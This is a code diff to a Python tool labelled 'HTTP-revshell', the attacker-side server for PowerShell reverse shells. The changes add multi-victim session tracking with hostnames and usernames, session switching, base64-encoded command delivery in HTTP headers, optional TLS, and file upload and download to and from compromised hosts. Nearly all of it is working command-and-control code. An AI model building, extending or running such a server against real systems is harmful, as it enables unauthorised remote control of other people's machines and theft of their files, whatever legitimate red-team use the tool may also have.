@@ -8,13 +8,17 @@ import readline
 import ssl
 import argparse
 import json
+from pynput.keyboard import Key, Controller
+import signal
 from datetime import datetime, date
 from OpenSSL import crypto, SSL
 from os import path
+from prettytable import PrettyTable
 
-
-global AUTOCOMPLETE
-AUTOCOMPLETE = False
+readline.parse_and_bind("tab: complete")
+CLIENT_DICT = {}
+CURRENT_CLIENT = ""
+KEY_PULSED = False
 
 class myHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -28,24 +32,51 @@ class myHandler(BaseHTTPRequestHandler):
     def do_POST(self):
         self.send_response(200)
         html = "<html><body><h1>It Works!</h1></body></html>"
-
+        client = self.client_address[0]
+        
         result, parser_type, json_response, color = self.parseResult()
+        self.controlNewClients(client, json_response)
         pwd = self.getPwd(json_response)
 
-        if (self.isDownloadFunctCalled(json_response)):
-            filename, file_content, output = self.parseDownload(json_response)
-            functions = Functions()
-            functions.download(filename, file_content, output)
-        else:
-            if json_response["result"] != json_response["pwd"] and json_response["type"] != "4UT0C0MPL3T3":
-                self.printResult(result, color)
+        if client == CURRENT_CLIENT:
+            if (self.isDownloadFunctCalled(json_response)):
+                filename, file_content, output = self.parseDownload(json_response)
+                functions = Functions()
+                functions.download(filename, file_content, output)
+            else:
+                if ((json_response["result"] != json_response["pwd"]) and 
+                ("InvokeWebRequestCommand" not in result) and
+                ("WebCmdletWebResponseException" not in result)):
+                    self.printResult(result, color)
 
-        try:
-            command = self.newCommand(pwd)
+            try:
+                if (parser_type == "newclient"):
+                    command = self.newCommand(pwd, True)
+                elif ("InvokeWebRequestCommand" in result):
+                    command = self.newCommand(pwd, False, True)
+                else:
+                    command = self.newCommand(pwd)
+                self.sendCommand(command, html)
+            except BrokenPipeError:
+                pass
+        if (parser_type == "newclient"):
+            command = self.newCommand(pwd, True)
             self.sendCommand(command, html)
-        except BrokenPipeError:
-            pass
         return
+        
+    def controlNewClients(self, client, json_response):
+        if (client not in CLIENT_DICT):
+            hostname = base64.b64decode(json_response["hostname"]).decode('utf-8')
+            username = base64.b64decode(json_response["cuser"]).decode('utf-8')
+            
+            if len(CLIENT_DICT) == 0:
+                CLIENT_DICT[client] = {"session":1, "hostname":hostname, "username":username}
+            else:
+                CLIENT_DICT[client] = {"session":list(CLIENT_DICT.items())[-1][1]["session"] + 1, "hostname":hostname, "username":username}
+
+        if len(CLIENT_DICT) == 1:
+            global CURRENT_CLIENT
+            CURRENT_CLIENT = list(CLIENT_DICT.keys())[0] 
 
     def parseResult(self):
         test_data = self.rfile.read(int(self.headers['Content-Length']))
@@ -53,7 +84,7 @@ class myHandler(BaseHTTPRequestHandler):
         parser_type = data["type"]
         result = ""
         color = "white"
-        global PSH_FUNCTIONS
+        client = self.client_address[0]
 
         if parser_type != "newclient":
             try:
@@ -63,22 +94,14 @@ class myHandler(BaseHTTPRequestHandler):
                     color = "green"
                 elif (parser_type == "3RR0R"):
                     color = "red"
-
-                if (parser_type == "4UT0C0MPL3T3"):
-                    PSH_FUNCTIONS = (base64.b64decode(data["result"])).decode('utf-8').split()
-                    readline.set_completer(completer)
-                    readline.set_completer_delims(" ")
-                    readline.parse_and_bind("tab: complete")
-
-                else:
-                    result = urllib.parse.unquote(data["result"])
-                    result = (base64.b64decode(data["result"])).decode('utf-8')
+                
+                result = urllib.parse.unquote(data["result"])
+                result = (base64.b64decode(data["result"])).decode('utf-8')
             except:
                 pass
         else:
-            input(colored("[!] New Connection, please press ENTER!",'red'))
-
-
+            input(colored("[!] New Connection from {}, please press ENTER!".format(client),'red'))
+        
         return result, parser_type, data, color
 
     def parseDownload(self, json_result):
@@ -117,18 +140,19 @@ class myHandler(BaseHTTPRequestHandler):
             pass
         return iscalled
 
-    def newCommand(self, pwd):
-        global AUTOCOMPLETE
-        if AUTOCOMPLETE:
-            command = "autocomplete"
-            AUTOCOMPLETE = False
-        elif pwd != "":
-            #readline.parse_and_bind("tab: complete")
-            command = input(colored("PS {}> ".format(pwd), "blue"))
-            if command == "":
+    def newCommand(self, pwd, newclient=False, reconnect=False):
+        command = ""
+        try:
+            if pwd != "":
+                if (not newclient) and (not reconnect):
+                    command = input(colored("PS {}> ".format(pwd), "blue"))
+                if command == "":
+                    command = "pwd | Format-Table -HideTableHeaders"
+            else:
                 command = "pwd | Format-Table -HideTableHeaders"
-        else:
-            command = "pwd | Format-Table -HideTableHeaders"
+        except EOFError:
+            global KEY_PULSED
+            KEY_PULSED = True
         return command
 
     def sendCommand(self, command, html, content=""):
@@ -144,7 +168,7 @@ class myHandler(BaseHTTPRequestHandler):
                             filename = command_list[1]
                     elif ('"' in command_list[1]):
                         filename = command.split('"')[1]
-
+                        
                     content = functions.upload(filename)
                     html = content.decode('utf-8')
                 except (AttributeError, IndexError, UnboundLocalError) as e:
@@ -158,6 +182,16 @@ class myHandler(BaseHTTPRequestHandler):
                 except IndexError:
                     print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                     print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))
+                    
+            elif (command.split(" ")[0]) == "exit":
+                # Delete current client from CLIENT_DICT
+                global CLIENT_DICT
+                global CURRENT_CLIENT
+                del CLIENT_DICT[CURRENT_CLIENT]
+                if len(CLIENT_DICT) > 0:
+                    CURRENT_CLIENT = list(CLIENT_DICT.keys())[0]
+                    print(colored("[*] Session has been closed", "green"))
+                    print(colored("[!] WARNING: Session been changed to {}!".format(CURRENT_CLIENT), "yellow"))
 
             CMD = base64.b64encode(command.encode())
             self.send_header('Authorization',CMD.decode('utf-8'))
@@ -182,6 +216,7 @@ class Functions():
                 print(colored(output, "green"))
         except:
             print (colored("\r\n[!] Error: Writing file!", "red"))
+
 
 class Certificate():
     def checkCertificateExpiration(self):
@@ -222,15 +257,74 @@ class Certificate():
             exist = True
         return exist
 
-def completer(text, state):
-    options = [i for i in PSH_FUNCTIONS if i.startswith(text)]
-    if state < len(options):
-        return options[state]
-    else:
-        return None
+class Readline_functions():
+    def completer(self, text, state):
+        main_commands = ["help", "exit", "sessions", "interact"]
+        options = [i for i in main_commands if i.startswith(text)]
+        if state < len(options):
+            return options[state]
+        else:
+            return None
 
-def main():
+    def main_help_banner(self):
+        print("\n")
+        print("Available commands to use :\n")
+        print("+++++++++")
+        print("help  \t\t\t\tShow this help menu")
+        print("sessions  \t\t\tList all active sessions")
+        print("interact {session_id}  \t\tInteract with a session. Example: interact 1")
+        print("exit \t\t\t\tClose the server")
+        print("\n")
 
+
+class Menu():
+    def printSessionTable(self):
+        t = PrettyTable(["Session ID", "IP", "Username", "Hostname"])
+        for client in CLIENT_DICT.keys():
+            t.add_row([CLIENT_DICT[client]["session"], client, CLIENT_DICT[client]["username"], CLIENT_DICT[client]["hostname"]])
+        print(colored(t.get_string(title="Sessions"), "green"))
+
+    def construct_menu(self, menu, server):
+        if menu[0] == "sessions":
+            #server.handle_request()
+            self.printSessionTable()
+
+        elif menu[0] == "exit":
+            server.server_close()
+            exit(0)
+
+        elif menu[0] == "help":
+            rf = Readline_functions()
+            rf.main_help_banner()
+        
+        elif menu[0] == "interact":
+            if len(CLIENT_DICT) == 0:
+                print(colored("[!] Sorry, there are no clients!", "red"))
+            else:
+                try:
+                    global CURRENT_CLIENT
+                    for client in list(CLIENT_DICT.keys()):
+                        if CLIENT_DICT[client]["session"] == int(menu[1]):
+                            CURRENT_CLIENT = client
+                    while True:
+                        global KEY_PULSED
+                        if KEY_PULSED:
+                            KEY_PULSED = False
+                            break
+                        request, client_address = server.get_request()
+
+                        if CURRENT_CLIENT == client_address[0]:
+                            if server.verify_request(request,client_address):
+                                server.process_request(request,client_address)
+                        else:
+                            server.finish_request(request, client_address)
+                except ValueError:
+                    print (colored("[!] Session number {} doesn't exist".format(menu[1]), "red"))
+
+def handler(signum, frame):
+    pass
+
+if __name__ == "__main__":
     banner = """
 ██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
 ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
@@ -245,15 +339,14 @@ def main():
     parser.add_argument('host', help='Listen Host', type=str)
     parser.add_argument('port', help='Listen Port', type=int)
     parser.add_argument('--ssl', default=False, action="store_true", help='Send traffic over ssl')
-    parser.add_argument('--autocomplete', default=False, action="store_true", help='Autocomplete powershell functions')
     args = parser.parse_args()
 
     try:
         HOST = args.host
         PORT = args.port
-        global AUTOCOMPLETE
         server = HTTPServer((HOST, PORT), myHandler)
         print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))
+        signal.signal(signal.SIGQUIT, handler)
 
         if (args.ssl):
             cert = Certificate()
@@ -261,16 +354,16 @@ def main():
                 cert.genCertificate()
             server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)
 
-        if (args.autocomplete):
-            AUTOCOMPLETE = True
-        else:
-            readline.set_completer_delims(" ")
+        server.handle_request()
+        rf = Readline_functions()
+        menu = Menu()
+        while True:
+            readline.set_completer(rf.completer)
             readline.parse_and_bind("tab: complete")
 
-        server.serve_forever()
+            menu_command = input(colored("\nHTTP-revshell> ", "yellow")).split(" ")
+            menu.construct_menu(menu_command, server)
 
     except KeyboardInterrupt:
         print (' received, shutting down the web server')
-        server.socket.close()
-
-main()
+        server.server_close()
